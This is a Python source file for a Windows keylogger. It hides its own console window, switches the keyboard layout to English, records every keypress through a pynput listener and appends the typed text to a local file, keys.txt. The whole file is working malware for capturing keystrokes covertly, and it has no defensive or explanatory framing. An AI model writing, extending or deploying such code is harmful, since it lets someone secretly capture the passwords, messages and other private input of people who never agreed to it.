from pynput.keyboard import Listener, Key
from layouts import Layouts
import win32api
import win32gui
import win32console
import ctypes


window= win32console.GetConsoleWindow()
win32gui.ShowWindow(window,0)

def is_en_layout():
    u = ctypes.windll.LoadLibrary("user32.dll")
    pf = getattr(u, "GetKeyboardLayout")
    return hex(pf(0)) == '0x4090409'
    
if  not is_en_layout():
    win32api.LoadKeyboardLayout("00000409",1)

def key_pressed(key):
    k = change_key(key)
    if key == Key.space or key == Key.enter:
        k = Layouts.get_word() + '\n'
    if key == Key.backspace:
        k = '*'
    if (k.find('Key.') == -1 and k != "\n"):
        with open('keys.txt','at', encoding='utf-8') as f:
            f.write(k)
            Layouts.write_char(k)
            
def key_released(key):
    if key == Key.esc:
        return False

def change_key(key):
    k = str(key)
    return k[1] if k[1] == "'" else k.replace("'",'')
    
with Listener(
    on_press = key_pressed,
    on_release = key_released,
) as listener:
    listener.join()